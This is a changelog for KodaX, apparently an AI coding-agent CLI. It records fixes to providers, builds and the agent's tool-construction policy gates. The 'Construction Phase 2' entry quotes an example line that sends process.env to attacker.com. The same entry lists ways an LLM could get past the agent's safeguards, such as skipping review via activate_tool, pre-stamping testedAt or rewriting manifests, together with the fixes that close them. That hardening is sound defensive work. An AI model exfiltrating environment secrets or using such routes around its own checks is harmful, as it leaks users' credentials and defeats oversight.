- **KodaX self-identity + runtime awareness in role prompts**: Scout / Planner / Generator / Evaluator role prompts now begin with a runtime-fact preamble identifying the agent as KodaX, naming the active provider + model, and stating which agent-mode (SA / AMA / managed) is driving the loop. Prevents identity confusion in multi-agent transcripts where the LLM occasionally hallucinates being "Claude" or "the assistant" and the user has to re-anchor.

### Fixed

- **Construction Phase 2 — policy gate ordering + lifecycle hardening**: a chain of bugs hollowed out the 4-layer defense model that v0.7.28 ships. Phase 2 review uncovered them all and this version closes them as a unit:
  1. `test()` removes its `loadHandler` call. Earlier code did `await import(file://...)` BEFORE the policy gate, so AST rules covering `eval` / `Function` did nothing against a top-level `await fetch('http://attacker.com', { body: process.env })`. Handler import is now exclusively inside `activate()` after the policy verdict is `'approve'`, making the policy gate the single chokepoint for code execution.
  2. `activate()` requires `artifact.testedAt` set. Without this an LLM could `stage_tool → activate_tool` directly, bypassing the AST / schema / LLM-review chain.
  3. `activate()` re-reads from disk by `name+version`. Filesystem is the source of truth (DD §14.1); the in-memory `handle.artifact` may be stale across the chain.
  4. `stage()` explicitly resets `testedAt` / `activatedAt` / `revokedAt` / `contentHash` on persist — defends against an LLM-supplied artifact pre-stamping `testedAt` to bypass the gate.
  5. `stage()` refuses any-status restage at the same `name@version`. Earlier code only blocked `'active'`; staged + revoked were allowed and both leak (the ESM module cache keys by file URL so re-writing `<version>.js` silently shadows previously-loaded code, and Node has no public ESM eviction API). Bumping semver is the only safe-by-construction update path.
  6. Path-traversal validation on `artifact.name` and `artifact.version` (rejects `/`, `\`, `..`, control chars, leading/trailing dots, length > 128, anything outside `[A-Za-z0-9][A-Za-z0-9._-]*`).
  7. `CtxProxy` honors `hostCtx.planModeBlockCheck` for `ctx.tools.<name>` calls. A constructed handler can no longer bypass the parent's plan-mode gate by routing builtin invocations through `ctx.tools.bash`. Predicate closes over live parent state, so toggles propagate.
  8. `CtxProxy` caps constructed→constructed call depth at `MAX_CONSTRUCTED_DEPTH=5`. Builtin callees are not counted (they don't recurse via `ctx.tools`). Catches accidental A→B→A loops.
  9. `activate()` records `contentHash = sha256(JSON.stringify(content))`; `rehydrateActiveArtifacts()` recomputes and compares. Mismatch → skip + console.warn + REPL boot banner surfaces a per-tool message ("X skipped due to manifest contentHash mismatch — re-stage and re-activate to re-approve"). Threat model: catches naive cross-session manifest tampering (LLM rewrites `.json` via the Write tool but doesn't recompute hash). Coordinated tampering (rewrite + recompute) is explicitly out of scope per single-user CLI threat model. Legacy artifacts written before `contentHash` existed rehydrate unchanged for upgrade-compat.
- **`redacted_thinking` data preservation through stream serialization**: Anthropic streams the `redacted_thinking` payload's `data` field on `content_block_start` itself (no deltas, and the stop event does not carry `content_block`). Earlier streaming code captured nothing at start and tried to read `(event as any).content_block.data` at stop — always `undefined`. The redacted reasoning was silently dropped from `thinkingBlocks`, breaking any downstream replay path. Fix: capture `block.data` into a new `currentRedactedData` state var at start; push from state at stop; reset between consecutive blocks so they don't bleed.
- **DeepSeek V4 thinking-mode multi-turn replay across providers** (issue 125): DeepSeek V4 thinking mode 400s on multi-turn requests when the assistant turn in history lacks `reasoning_content` (empirically reproduced via direct API probe). Switching from an Anthropic-compat provider to DeepSeek V4 mid-conversation also lost prior reasoning since cross-provider thinking blocks couldn't replay against Anthropic's signature verification.
  - `openai.ts`: when the `replayReasoningContent` flag is set, every assistant turn carries `reasoning_content` (defaults to `''`) regardless of whether the turn produced thinking — covers cross-provider switch and thinking-only / redacted-only / no-thinking history shapes.
  - `anthropic.ts`: under `strictThinkingSignature` (Anthropic official), cross-provider thinking blocks without trusted signatures convert to a `<prior_reasoning>` text block injected before tool_use to preserve reasoning intent. Kimi guard skips when strict mode is on.
  - `KodaXProviderConfig`: new `replayReasoningContent` and `strictThinkingSignature` flags. `AnthropicProvider` gets `strictThinkingSignature: true`; DeepSeek V4 + Kimi/Qwen/Zhipu OpenAI-compat all opt into `replayReasoningContent` (DeepSeek verified; the other three share the identical failure-mode shape and opt in for max fault-tolerance per user direction; OpenAI proper stays explicitly off — different protocol).
- **Session history preservation on permanent thinking-mode errors** (regression): when DeepSeek thinking-mode 400 (or any permanent provider error) hit the SA / runner-driven loop, the outer wrapper used to write `messages: []` to the session snapshot, wiping the user's conversation on `/resume` — next prompt would start as a fresh session with no Scout context and progress bar at 0.
  - L0 (history preservation): inner catch (`runner-driven.ts`) attaches in-flight `providerMessages` to the thrown error via a non-enumerable `__kodaxRecoveredMessages` property. Outer catch reads it back through an `Array.isArray` guard. Non-enumerable so JSON-serializing telemetry doesn't dump conversation history into logs.
  - L3 (`sanitize_thinking_and_retry` recovery action): classifier identifies `reasoning_content_required` errors via three patterns; recovery coordinator gains a single-shot `thinkingSanitizationUsed` latch — drops thinking blocks once and retries once, bypassing `maxRetries`. Both runner-driven (Layer-A) and `agent.ts` (legacy SA) loops carry parallel sanitize-bypass branches; SA and AMA are first-class parallel surfaces.
  - REPL UX: `retry-history` banner gets a specific message for the sanitize action so users see "dropping prior thinking · retrying" instead of the generic "Provider request timed out · retrying".
- **Issue 124 — `dispatch_child_task` fan-out gates closed**: tool was rarely triggering in real usage despite existing since v0.7.18 (FEATURE_067). Empirical eval across `zhipu-coding`, `minimax-coding`, `deepseek-v4-flash` showed the LLM dispatches correctly when given the tool — the bottleneck was layered controller gates closing the fan-out signal before downstream consumers ever saw it.
  - Gate changes (`reasoning.ts`): drop `H0_DIRECT` requirement on evidence-scan + module-triage so H1 read-only investigation can fan out (the earlier H0-only gate made dispatch effectively impossible after Scout escalated); enable hypothesis-check in `H2_PLAN_EXECUTE_EVAL` (previously hardcoded `return false`); drop blanket `profile === tactical` filter for read-only fan-out classes (hypothesis-check / write class still requires tactical for safety).
  - Prompt change (`role-prompt.ts`): added "When NOT to use dispatch_child_task" negative-bumper list to Scout and Generator prompts. Empirically tested on 3 providers × 3 variants × 3 tasks; ties or improves over the existing RULE A/B/C prompt.
  - Telemetry (`dispatch-child-tasks.ts`): emit `[dispatch] start/end` progress markers via existing `ctx.reportToolProgress` (`KodaXEvents` channel) — zero new event types, zero new logger. `try/finally` ensures balanced start/end pairs even on executor exception.
- **`scripts/build-binary.mjs` `--define` quoting on Windows** (latent build bug): Bun's `--define key=value` substitutes the source text of `value` for every reference to `key`. The script passed `--define process.env.NODE_ENV="production"` as a Node `spawnSync` arg. On Windows the embedded `"` characters are stripped during the `spawnSync` → `CreateProcess` pipeline, so bun saw `process.env.NODE_ENV=production` and substituted bare identifier `production` — undefined at runtime, binary crashed immediately with `ReferenceError: production is not defined` at first React import. Switched to single-quoted JS string literals (`'production'`, `'true'`, `'${version}'`); single quotes survive the round-trip and bun substitutes a real string literal. Same fix applied to `KODAX_BUNDLED` and `KODAX_VERSION`. `react-devtools-core` added to `devDependencies` so `bun --compile`'s static import resolution can satisfy Ink's conditional dev-only branch (without it the bundle phase aborted with `Could not resolve: "react-devtools-core"`).
- **`kimi.k2.5` context window 128K → 256K**: earlier descriptor pin was a misreading of Moonshot's docs. Corrected in `64785de`; the subsequent FEATURE_098 plumbing now reads the correct value.
- **`max_tokens` routing — salvage + L5 normalization, L1 escalation dropped, zhipu watchdog**: cleaned up the layered `max_tokens` selection so partial-JSON salvage + L5 (final clamp to provider ceiling) is the canonical path; L1 (per-request escalation) had become redundant after FEATURE_098 plumbed per-model `maxOutputTokens` and was removed. New zhipu watchdog handles the case where the gateway responds with a token budget below the configured request — falls back to the gateway's reported limit instead of looping the request.
- **`mimo-coding` provider wiring**: cost-rates entry, RST-prone list inclusion (servers requiring `tool_use` input salvage), and config example.
- **`managed-worker` role prompt missing runtime fact**: the runtime-awareness preamble that Scout / Planner / Generator / Evaluator received was not threaded through the managed-worker path. Fixed so worker agents in the managed task graph also see the active provider / model / agent-mode.
- **`repl` package vitest config missing `@kodax/skills/shared/yaml` subpath alias**: follow-on to v0.7.27 FEATURE_086 子任务 B 第 5 条. Test runs in the `repl` package now resolve the new subpath export.
- **Provider-policy / extension-runtime / bash test flaky timeouts**: stabilized via deterministic clock injection where the underlying logic was correct but tests were time-sensitive.

### Changed

- **Active model passed at the wire layer (anthropic / openai providers)**: prerequisite for FEATURE_098 per-model lookup. Rather than reading the provider's default model at request build time, the wire-layer methods now accept the active model identifier so the descriptor lookup hits the **actual** model, not the provider default.
- **Active model threaded through compaction call sites (coding / repl)**: same thread, downstream — compaction's `contextWindow` calculation now uses the active model's descriptor instead of the provider's default-model descriptor.
- **CLI dead-code cleanup + `constructed_cli` reserved-name tightening**: removed an unused `CliBootstrapContext` interface, an unused `listToolDefinitions` import, and clarified the reserved-subcommand list so a constructed tool literally named `skill` / `acp` / `completion` / `tools` cannot shadow the matching commander subcommand.

### Documentation

- **FEATURE_098 / FEATURE_099 entries recorded**: provider catalog refresh + per-model context window / output limits documented as v0.7.28 features (originally planned for v0.7.29; pulled in because implementation completed early). Includes the `kimi.k2.5` 128K → 256K post-implementation correction note.
- **`kodax.config.ts` policy override design retracted**: an earlier draft proposed a user-authored `constructionPolicy` exported from `kodax.config.ts`. Review concluded this violated KodaX philosophy (`leverage LLM intelligence` + `NEVER add configuration for hypothetical needs`) — single-user CLI doesn't need a config hook the user has to think about; if a future need arises, the right shape is a `risk_mode` enum (`'strict' | 'balanced' | 'trusting'`) auto-driven by capabilities, not user-written policy functions. Deferred Design Decisions appendix in `docs/features/v0.7.28.md` records the retraction + rationale.
- **OpenAI-compat thinking replay limitation note updated**: kimi / qwen / zhipu now opt into `replayReasoningContent` (max-tolerance), tracked in KNOWN_ISSUES 125 for "未独立 API 实证" follow-up.
- **`agent.ts` sanitize-bypass comment corrected**: the legacy SA loop and the AMA Layer-A loop are *parallel* paths, not legacy → migration. The earlier comment implied SA was being phased out; corrected to reflect that both surfaces are first-class.
- **Known issue 124 — dispatch eval baseline + provider variance probe**: documents the 4-layer compounding gate closure root-cause analysis, the implementation slice (A1 / A2 / A5b / A4 / B1) and follow-ups (A3 phantom, B2 / B3 data-driven defer, A2 pre-Scout heuristic limitation), and the cross-model variance baseline (`deepseek-v4-flash` 100% / `v4-pro` 60% / `chat` 40% direct fan-out, with v4-pro's "scope-first" pattern being delayed-but-correct multi-turn dispatch, not missed dispatch).
- **`compaction.contextWindow` clarified as manual override**: with FEATURE_098 reading per-model descriptor as the default, the user-configurable knob is now explicitly an override path. README + config docs updated accordingly.
- **FEATURE_098 follow-up planning for v0.7.29**: tracks remaining per-model gaps (e.g., `gpt-5*` family, future Anthropic models) where descriptor data is incomplete.

---

## [0.7.27] - 2026-04-24

### Theme

Structural hygiene tail — legacy cleanup + repo-intelligence protocol extraction + AMA repo-intel prompt injection regression fix + Ink TUI trace surface.

### Added

- **FEATURE_091 — `@kodax/repointel-protocol` standalone package** — extract the daemon RPC contract (`REPOINTEL_CONTRACT_VERSION`, `RepointelCommand`, `RepointelRequestPayload`/`RpcRequest`/`RpcResponse`, `RepoPreturnBundle`, host/intent enums, default endpoint) into a zero-runtime-deps npm package so external CLI clients (codex / claude / opencode) can depend on the contract without pulling the whole `@kodax/coding` runtime. Publishing path: `packages/repointel-protocol/`.
  - Consumers migrated to import from `@kodax/repointel-protocol`: `packages/coding/src/index.ts` re-exports `REPOINTEL_DEFAULT_ENDPOINT` unchanged, `packages/coding/src/repo-intelligence/premium-client.ts` + `runtime.ts` switch to the new import source; the original `packages/coding/src/repo-intelligence/premium-contract.ts` is removed (git tracks the rename to `packages/repointel-protocol/src/index.ts`).
  - `tsconfig.build.json` + `packages/coding/tsconfig.json` + `packages/coding/package.json` + `vitest.config.ts` all wired; `@kodax/coding` top-level consumers see no surface change.
- **Ink TUI repo-intelligence trace surface (OFF by default in REPL, tight-stacked)** — new `packages/repl/src/ui/utils/repo-intel-history.ts` renders `emitRepoIntelligenceTrace` / `emitManagedRepoIntelligenceTrace` events as single-line info items (`📡 [RepoIntel] <stage> · <details>`) with `tightSpacing: true` so consecutive trace stages stack as one compact block instead of each claiming an extra blank line. Wired in `InkREPL.tsx` via `emitInfoItemToCorrectLayer`, which now propagates `tightSpacing` through the managed-foreground ledger (previously dropped when reconstructing the ledger item, causing blank lines to return on AMA turns). `HistoryItemInfo` gained an opt-in `tightSpacing?: boolean`; `InfoItemRenderer` switches `marginBottom` between `0` and `1` based on the flag. `repoIntelligenceTrace` defaults to OFF for the Ink REPL to match v0.7.20-era transcript density (tool calls surface as usual; auto-injection stays silent unless opted in); `/repointel trace on` persists opt-in to `~/.kodax/config.json`. CLI / ACP surfaces keep the pre-existing env-only default (false) unchanged.
- **Planner / H1 Evaluator / H1 readonly Generator can now invoke repo-intel deep-capsule tools** (`module_context` / `symbol_context` / `process_context` / `impact_estimate`). Previously only Scout (unrestricted) and H2 Generator (open-scope) had access; Planner shaping a cross-module sprint contract and Evaluator precisely quantifying blast radius had to fall back to grep heuristics or wait for Scout/Generator to surface the capsule. auto-injection (FEATURE_083) still only packs the **active** module + impact, so explicit lookups were the missing path for cross-module work. Extension lives in `tool-policy.ts` allow-lists only; tool descriptions at the registry layer already explain the contract, so no role-prompt text changes were needed. Allow-list regression tests in `tool-policy.test.ts` pin the new members.

### Fixed

- **AMA Runner-driven path lost prompt-level repo-intelligence injection** (regression introduced in v0.7.26 FEATURE_084 Shard 6d-L). Legacy `runKodaX` injected the repo-intelligence context block (Repository Overview, Changed Scope, Active Module Intelligence, Active Impact Intelligence, Repo Intelligence Guidance) into every Scout / Planner / Generator / Evaluator role's system prompt via `buildAutoRepoIntelligenceContext` + `buildSystemPrompt`. The Runner-driven path built the role agents directly and invoked them via `Runner.run`, bypassing `runKodaX` entirely, so AMA agents ran with no prompt-level repo awareness for a full version.
  - Fix: `buildAutoRepoIntelligenceContext` is now exported from `agent.ts`; `runManagedTaskViaRunner` computes the block once per entry (after `plan` resolves, before Agent chain construction) using the same `isNewSession` heuristic legacy `runKodaX` used (`messages.length === 1` → `session.initialMessages?.length === 0`). The pre-built string threads through `RunnerChainPromptContext.repoIntelligenceContext`; `resolveRoleInstructions` prepends it to every role's `createRolePrompt` output. Capture failure is swallowed (best-effort, matches legacy resilience). Tests / topology-only paths that don't set the field behave exactly as before.
- **`edit` / `multi_edit` error messages lost information in v0.7.26** — ambiguous-match + not-found error diagnostics now include line numbers, widened-anchor guidance, and the anchor-consumed-by-prior-edit case-specific diagnostic (issue #122). Restored all message detail the P2b/C4 tightening had trimmed. Symmetric across `edit` and `multi_edit`.
- **Scout/Generator PARALLEL CHILD AGENTS rule — single readOnly child dispatch re-enabled for heavy investigations**. Previously a categorical "NEVER dispatch exactly 1 child" rule blocked the case where one investigation's raw volume would crowd parent context. The rule is now a 3-branch decision tree (A — 2+ independent threads → per-thread fan-out; B — one investigation whose raw volume would crowd parent context AND only needs a summary → single readOnly child; C — small targets known + single-round → in-place parallel tool calls). `buildManagedReasoningPlan` also now builds a prompt-only heuristic fallback plan when provider resolution throws, so `chainPromptContext` stays populated and downstream role prompts keep the v0.7.22-parity context instead of falling back to minimal SCOUT_INSTRUCTIONS_FALLBACK.
- **Windows `.exe` `repointel` bin invocation failed with "not recognized as an internal or external command"** (latent since v0.7.15 per `quoteWindowsCmdArg`'s introduction; exposed now because the FEATURE_086 parity restore above reinstates the per-turn repo-intel probe on the Runner-driven path). `executePremiumBinCommand` and `warmPremiumViaBin` routed Windows bins through `cmd.exe /d /s /c "<quotedBin> <cmd> <quotedPayload>"`. Node's Windows argument escaping wraps the `/c` payload in outer quotes, which combined with `quoteWindowsCmdArg`'s inner quotes produced `\"C:\...\"` pairs that cmd's `/s` strip-rule could not undo — cmd tried to execute the literal `\"C:\Tools\...\repointel.exe\"` as a single command name and failed. Symptom: `/repointel status` reported `status=unavailable, fallback=oss` even when the daemon was already listening at the configured endpoint; `buildAutoRepoIntelligenceContext` silently fell back to the OSS baseline on every turn.
  - Fix 1 — **`windowsBinNeedsShell(extension)` predicate** gates the `cmd.exe` branch. Only `.bat` / `.cmd` launchers still go through the shell; `.exe` / `.com` and bare PATH names execute directly via `execFile`, whose CreateProcess-backed quoting handles spaces and special characters natively. Applied symmetrically to `executePremiumBinCommand` and `runPremiumBinSubcommand` (renamed from `warmPremiumViaBin`, now parameterized over `'warm' | 'daemon'` so the same dispatcher can spawn SEA native daemons).
  - Fix 2 — **`ensurePremiumDaemonReady(bin, endpoint)` defense-in-depth**: HTTP-probes `<endpoint>/rpc` with a `status` command before touching the bin. If the daemon is already running the bin is never invoked, which also side-steps any remaining shell-quoting quirk on unusual bin paths. Falls back to `bin warm` → `bin daemon` (for SEA native binaries whose `warm` runs in direct mode without spawning a daemon) → poll endpoint at 150ms intervals until answered or the 2s deadline elapses. `warmRepoIntelligenceRuntime` and `callPremiumDaemon` route through it; contract / build-id mismatch branches continue to use `warmPremiumViaBin` alone since `tryRecycleStaleDaemon` expects the CLI path.
  - Regression test in `premium-client.test.ts` covers the "fetch failed + bin subcommands exited cleanly but daemon still unreachable" case to pin `ensurePremiumDaemonReady`'s null-return contract.
- **First-turn `refresh: true` preturn deterministically fell back to OSS** on medium repos (~800 source files). The daemon rebuilds its semantic index when `refresh: true` is set; on this author's `KodaX` repo the rebuild takes ~10.5s, but `PREMIUM_REQUEST_TIMEOUT_MS` was capped at 4s for all commands. The fetch aborted with `AbortError` → outer catch wrote `premiumFailureCache` → every subsequent call within the 2s TTL was short-circuited to `null` → the entire new session landed on OSS fallback despite a perfectly healthy daemon. `/repointel status` (which goes through `executePremiumBinCommand`, a separate path) still reported `status=ok, transport=daemon`, making the symptom hard to diagnose.
  - Fix 1 — **layered fetch timeout**. New constant `PREMIUM_REFRESH_TIMEOUT_MS = 30_000`; `selectRequestTimeoutMs(request)` picks the 30s budget when `payload.refresh === true` and keeps the 4s budget for hot-path requests.
  - Fix 2 — **transient-timeout cache guard**. New `isTransientTimeoutError(error)` recognises `AbortError` / `TimeoutError` / `aborted` / `timeout` messages (with recursive `cause` walk to cover undici's wrapped errors). `callPremiumDaemon`'s outer catch suppresses `rememberPremiumFailure` when the error is transient, so a single slow call cannot poison the cache for the following 2s window. Structural failures (bin missing, contract mismatch, daemon-reported `status: 'unavailable'`, build mismatch) continue to poison the cache to suppress spam.
  - Regression test in `premium-client.test.ts` covers the two-phase "first call aborts, second call succeeds" scenario — under v0.7.26 the second call would have been cache-skipped and returned `null`; under the new guard it reaches fetch and succeeds.
- **Third-party Qwen-compat gateways returning `400 System message must at the begin`** after a few rounds. After compaction, lineage injects `[compaction-summary, post-compact-ledger, post-compact-file-content, ...]` as contiguous `role:'system'` entries at the start of the transcript. Under v0.7.26 the Runner-driven LLM adapter took only `messages[0]` as the system prompt (legacy assumption: exactly one leading system entry), left the rest as mid-transcript system messages, and the OpenAI-compat provider then also prepended its own `{ role: 'system' }`. Strict Qwen proxies reject any non-leading system message, and the wire ended up with 2-4 system entries interleaved.
  - Fix 1 — **`buildRunnerLlmAdapter` merges every leading contiguous system entry** (not just `messages[0]`) into the adapter-level `system` parameter, so agent role instructions, compaction summary, and post-compact attachments collapse into one string; the transcript that the provider sees starts cleanly at the first user/assistant turn.
  - Fix 2 — **`KodaXOpenAICompatProvider.normalizeSystemForWire` collapses every `role:'system'` on the wire** (the `system` parameter plus any system message the adapter didn't catch) into a single top-of-wire system content, defence-in-depth for any caller path that might still slip a second system through.
  - Fix 3 — **v0.7.22 parity: `cleanupIncompleteToolCalls` + `validateAndFixToolHistory` re-enabled at the adapter level** (legacy `agent.ts` called these before every provider request; Runner-driven path had dropped them). Prevents orphaned `tool_use` → `tool_result` pairs that would otherwise produce the `"Cleaned incomplete tool calls"` post-trim at the same proxies.
  - Regression test in `runner-driven.test.ts` covers the "3 contiguous leading system messages merge into one" case plus the tool-history sanitization path.
- `/mode` autocomplete now ranks exact command prefix above fuzzy substring.
- REPL altScreen flicker on SSH / Windows ConPTY eliminated by merging `log.clear() + log()` into a single `log.clearAndRender()` call (stop-gap while FEATURE_057 Track F / FEATURE_096 land the proper host-downgrade policy).

### Changed

- **FEATURE_086 子任务 B 第 5 条 — shared YAML frontmatter helpers extracted to `@kodax/skills/shared/yaml`**. `sanitizeYaml` / `normalizeHooks` / `parseYamlFrontmatter` / `normalizeAllowedToolsString` / `normalizeYamlHookEntry` / `normalizeYamlHookEntryList` / `normalizeYamlHookMap` lived as duplicate copies in `packages/skills/src/skill-loader.ts` and `packages/repl/src/commands/discovery.ts`. Unified to a single source under `packages/skills/src/shared/yaml.ts`; `package.json` adds the `"./shared/yaml"` subpath export; `vitest.config.ts` aliases the subpath (placed before `@kodax/skills` for prefix precedence). Behaviour identical.
- **FEATURE_086 子任务 B 第 6 条 — Provider config / snapshot dedup via `buildProviderConfig` helper**. `KODAX_PROVIDER_SNAPSHOTS` is now the single source of truth for `apiKeyEnv`, `model`, and `reasoningCapability`. Each of the 9 built-in Provider classes derives those three fields via `buildProviderConfig(name, extras)` so the class config and the snapshot cannot drift out of sync. `ProviderSnapshot` type + `KODAX_PROVIDER_SNAPSHOTS` const moved above the class definitions to avoid forward-reference gymnastics. Net -6 lines; no behaviour change.
- **FEATURE_086 子任务 B 第 7 条 — Lazy-singleton built-in providers with env-aware invalidation**. `getProvider(name)` no longer constructs a fresh SDK client (`new Anthropic({...})`, `new OpenAI({...})`) on every call. The `builtinProviderCache` keys on both provider name and current `*_API_KEY` env value so tests that mutate env between cases still see fresh clients. New `resetBuiltinProviderCache()` export for explicit test isolation.

### Removed

- **FEATURE_086 子任务 B 第 3 条 — `/project` 命令整块删除**（FEATURE_054 目标达成并归档；AMA Scout-first via `--agent-mode ama` 自 FEATURE_061 起已完整覆盖。此前版本 /project 与 AMA 并存，本版本只剩 AMA 作为项目级工作流入口）
  - **破坏性变更**：CLI flag（`--init` / `--append` / `--overwrite` / `--auto-continue` / `--max-sessions` / `--max-hours`）+ 公开 API（`ProjectStorage` / `ProjectFeature` / `ProjectState` / `ProjectStatistics` / `FeatureList` / `calculateStatistics` / `getNextPendingIndex` / `isAllCompleted` / `handleProjectCommand` / `detectAndShowProjectHint` / `buildInitPrompt` / `getFeatureProgress` / `checkAllFeaturesComplete`）+ REPL 命令 `/project *` 全部不可用；未升级到 AMA 的下游代码需在 v0.7.27 前迁移
  - **迁移路径**：
    - `kodax --init "..."` / `kodax --auto-continue` → `kodax --agent-mode ama "..."`（Scout 自动路由 H0/H1/H2）
    - `/project brainstorm` / `/project plan` / `/project next` / `/project auto` → AMA 内置 Planner 自动吸收 brainstorm + plan + execute 流程
    - `feature_list.json` / `PROGRESS.md` 手工维护 → AMA 内部 evidence bundle + managed-task 归档（`.agent/managed-tasks/`）
  - **实际删除清单**（Commits A→D，净 −12,000+ 行）：
    - **Commit A（Layer 6 heuristics）**：`packages/coding/src/prompts/long-running.ts`（LONG_RUNNING_PROMPT），`detectLongRunningProjectContext` / `getLongRunningContext` / `harness: 'project'` hint path，`'Project harness'` /provider 场景
    - **Commit B（Layer 4+5 CLI surface）**：`src/kodax_cli.ts` 6 个 flag 注册与 help 文案，`src/cli_option_helpers.ts` 的 `init` / `append` / `overwrite` / `autoContinue` / `maxSessions` / `maxHours` 字段与 `parseNonNegativeIntWithFallback` / `parsePositiveNumberWithFallback` helper，`packages/repl/src/common/utils.ts` 的 `buildInitPrompt` / `getFeatureProgress` / `checkAllFeaturesComplete` / `readFeatureProgressSnapshot`
    - **Commit C（Layer 0-3 module）**：`packages/repl/src/interactive/project-{brainstorm,commands,harness,harness-core,harness-types,planner,quality,state,storage,workflow}.ts`（10 个）+ 对应 `*.test.ts`（9 个）+ `commands-project-shim.test.ts` + `completers/project-completer.ts`；barrel 再导出全量清理（`packages/repl/src/interactive/index.ts` / `packages/repl/src/index.ts` / `src/index.ts`）；`commands.ts` 的 `LEGACY_PROJECT_COMMAND_NAMES` / `printProjectMigrationGuidance` stub + 两处 call sites；`completers/command-arguments.ts` 的 `PROJECT_ARGS` 死常量；`json-guards.ts` 的 `isFeatureList` / `isProjectFeature` / `isProjectWorkflowState` / `isProjectControlState` / `isBrainstormSession` + 配套常量；`repl.ts` + `InkREPL.tsx` 的 `result.projectInitPrompt` 分支；`CommandResult` / `CommandResultData` 类型字段；`KodaXTaskSurface` 收紧为 `'cli' | 'repl' | 'plan'`，`getManagedTaskWorkspaceRoot` 的 `.agent/project/managed-tasks/` 分支合并至 `.agent/managed-tasks/`
    - **Commit D（尾清理 + 文档）**：`KODAX_FEATURES_FILE` / `KODAX_PROGRESS_FILE` 两个 orphan 常量；README / README_CN / packages/coding/README.md 的 Project Mode 章节与公开 API 示例；`docs/FEATURE_LIST.md` FEATURE_054 scope 归档
  - **FEATURE_054 归档**：v0.7.27 之前 FEATURE_054 的目标是"把 /project 吸收进 AMA H2"。实际执行中发现 AMA 自 FEATURE_061 起已完整覆盖 /project 功能面，"吸收"任务转为直接"删除"，FEATURE_054 随本版归零
- **FEATURE_086 子任务 B 第 2 条 — `--team` CLI flag 彻底移除**（ADR-017 定废；FEATURE_027 自 v0.7.10 起已用 `--agent-mode ama|sa` 替代；此前只是 sunset handler 软下架）
  - `src/kodax_cli.ts`：删除 commander `.option('--team <tasks>', ...)` 注册、`team` help topic 对象、help 索引行、全局 help 行、help topics 字符串、bash completion 字符串里的 `--team`、`opts.team` 传递、sunset handler block
  - `src/cli_option_helpers.ts`：删除 `CliOptions.team?: string` 字段 + `validateCliModeSelection` 的 json-mode guard 里的 `|| cliOptions.team` 条件
  - `tests/kodax_cli.test.ts`：`should document provider and team caveats` 改名为 `provider and project caveats`，移除 team 文案断言，加 `not.toContain('--team')` 作为负向守卫
  - 用户可观察行为变化：`kodax --team xxx` 从 "[Deprecated] --team has been sunset" 错误 → commander 原生 `error: unknown option '--team'`（两者都 exit 1，后者带 "Did you mean ...?" 建议，对用户更友好）
  - `README.md`：删除 `--team <tasks>` 的 CLI options 行；`--team "..."` 示例改为 `--agent-mode ama "..."` 等价示例，保留多 agent 并行的展示意图
  - `docs/test-guides/FEATURE_GENERAL_v0.5.20_TEST_GUIDE.md`：顶端加归档提示，说明 `--team` / Agent Team 相关 TC 随 v0.7.27 失效，替代入口为 `--agent-mode ama`
  - 勘误同步：`docs/features/v0.7.27.md` 里 FEATURE_086 子任务 B 第 2 条的文字更正 —— v1 设计稿误以为"CLI flag 已从 `src/**/*.ts` 移除，本版只清 config.json 残留"，实际 CLI flag 完整在 src 里，config.json 从来没有 `team` 字段
- **FEATURE_086 子任务 B 第 1 条 — `compactMessages()` 及相关常量移除**（v0.7.23 已标 `@deprecated`，计划于 v0.7.27 移除）
  - 删除 `packages/agent/src/messages.ts`（函数定义）
  - 从 `@kodax/agent` / `@kodax/coding` 的 public export 移除 `compactMessages`
  - 同步移除孤儿常量 `KODAX_COMPACT_THRESHOLD` / `KODAX_COMPACT_KEEP_RECENT`（仅被原函数使用，新机制的等价配置在 `DefaultSummaryCompactionOptions` 的 `thresholdRatio` / `keepRecent` 字段）
  - 迁移指南：coding preset 使用 `@kodax/session-lineage` 的 `LineageCompaction`（保留 FEATURE_072 post-compact reconstruction）；通用 agent 使用 `@kodax/core` 的 `DefaultSummaryCompaction`。两者共享 `CompactionPolicy` 接口（FEATURE_081, v0.7.23）
  - 安全保障：`packages/core/src/compaction.test.ts` (16 tests) + `packages/session-lineage/src/compaction.test.ts` (5 tests) 覆盖新路径；生产 compaction 自 v0.7.26 已走 Runner-driven `compactionHook`
- 文档同步：`README.md` / `packages/agent/README.md` 的代码示例从 `compactMessages` 改为 `DefaultSummaryCompaction`；`docs/test-guides/FEATURE_010_PHASE3_AGENT_PACKAGE_v0.5.3_TEST_GUIDE.md` 加顶端归档提示

---

## [0.7.26] - 2026-04-23

### Added
- **FEATURE_084 — Task Engine Phase 2: Scout/Generator/Evaluator rewritten on Layer A Runner primitives**
  - New `packages/coding/src/task-engine/runner-driven.ts` (2545 LoC) replaces the legacy `runManagedTask` state machine; dispatch gated via `KODAX_MANAGED_TASK_RUNTIME=runner` env flag (Shard 5a/5b), then flipped to default and legacy AMA orchestration deleted (Shard 6d-a/6d-b).
  - Scout / Planner / Generator / Evaluator re-expressed as `Agent` instances with `Handoff` topology (`buildRunnerAgentChain`). H0/H1/H2 state machine now encoded as declarative continuation handoffs.
  - fenced-block text protocol replaced by tool-call structured protocol (absorbs FEATURE_059 dual-track `visibleText + protocolPayload` goal): `emit_scout_verdict` / `emit_contract` / `emit_handoff` / `emit_verdict` runnable tools in `packages/coding/src/agents/protocol-emitters.ts`, Zod-validated payloads.
  - Shard 6a: observer events + full `managedTask` payload parity (`ObserverBridge`).
  - Shard 6b: real budget tracking (`ManagedTaskBudgetController`, per-harness caps + 90% approval dialog) + mutation tracker wiring (`wrapGenerator{Bash,Write}WithMutationGuard`).
  - Shard 6c: checkpoint detection + per-role crash-safe write (FEATURE_071 parity); `--continue` path reads checkpoint and prompts user.
  - Shard 6d-c: observer / stream / budget-extension parity fixes vs legacy.
  - Shard 6d-d: `onIterationEnd` + `contextTokenSnapshot` parity.
  - Shard 6d-e: `session.initialMessages` pass-through so REPL multi-turn / resume / plan-mode replay see full prior context.
  - Shard 6d-f: role-scoped tool boundaries + evaluator shell mutation guard (`wrapReadOnlyBash`).
  - Shard 6d-g..Q: Runner-driven v0.7.22 parity — `promptOverlay` stitching, Scout suspicious-completion detection, `dispatch_child_task` role wrappers with write-worktree path registration for Evaluator diff injection (FEATURE_067 v2 parity).
  - Shard 6d-S: `taskVerification.runtime` surfaced into Evaluator instructions (startup command, ready signal, UI/API/DB checks) so Evaluator actively probes runtime rather than writing verdict from static reads.
  - Shard 6d-T: dynamic Generator / Evaluator instructions so Scout's skillMap obligations reach the executing/verifying model.
- **FEATURE_085 — Guardrail tri-layer runtime (Input / Output / Tool)**
